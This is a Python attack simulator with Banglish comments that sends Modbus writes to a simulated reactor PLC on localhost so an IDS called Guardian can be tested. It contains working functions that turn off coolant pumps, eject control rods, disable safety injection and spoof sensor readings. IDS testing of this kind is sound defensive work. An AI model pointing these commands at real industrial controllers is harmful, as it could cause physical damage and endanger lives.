#!/usr/bin/env python3
"""
Attacker Simulation
===================
NOKOL reactor PLC er against e Modbus attack dekhay. Eigula ei jonno je
tumi Guardian IDS ke test korte paro -- "attack korle IDS dhore kina?"

!!! Shudhu nijer local simulator (127.0.0.1:5020) er jonno. Real system e
    permission chhara cholaile ETA APORADH. !!!

Attacks:
  pump-off   : coolant pump bondho kore dey (loss-of-coolant)
  rod-eject  : control rod hothat 100% tene ney (Stuxnet-style)
  overheat   : flow kombe diye core gorom koray
  safety-off : safety injection disable kore
"""
import argparse
import time

from pymodbus.client import ModbusTcpClient

HR_FLOW, HR_ROD = 2, 3
CO_PUMP, CO_SAFETY = 0, 1


def c(host, port):
    cl = ModbusTcpClient(host, port=port)
    cl.connect()
    return cl


def attack_pump_off(cl, slave):
    print("[attack] coolant pump OFF kore dicchi...")
    cl.write_coil(CO_PUMP, False, slave=slave)


def attack_rod_eject(cl, slave):
    print("[attack] control rod 100% tene nicchi (rod ejection)...")
    cl.write_register(HR_ROD, 100, slave=slave)


def attack_overheat(cl, slave):
    print("[attack] coolant flow 10% e namiye dicchi...")
    cl.write_register(HR_FLOW, 10, slave=slave)


def attack_spoof(cl, slave):
    print("[attack] pump OFF kore RPM sensor 1800 'healthy' dekhacchi (false data injection)...")
    cl.write_coil(CO_PUMP, False, slave=slave)
    cl.write_register(5, 1800, slave=slave)


def attack_safety_off(cl, slave):
    print("[attack] safety injection disable korchi...")
    cl.write_coil(CO_SAFETY, False, slave=slave)


ATTACKS = {
    "pump-off": attack_pump_off,
    "rod-eject": attack_rod_eject,
    "overheat": attack_overheat,
    "safety-off": attack_safety_off,
    "spoof": attack_spoof,
}


def main():
    ap = argparse.ArgumentParser(description="ICS attack simulator (local lab only)")
    ap.add_argument("attack", choices=list(ATTACKS) + ["all"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5020)
    ap.add_argument("--slave", type=int, default=1)
    args = ap.parse_args()

    cl = c(args.host, args.port)
    print(f"[attacker] connected to {args.host}:{args.port}")
    if args.attack == "all":
        for name, fn in ATTACKS.items():
            fn(cl, args.slave)
            time.sleep(1)
    else:
        ATTACKS[args.attack](cl, args.slave)
    cl.close()
    print("[attacker] done -- ekhon Guardian er dashboard e dekho alert elo kina.")


if __name__ == "__main__":
    main()
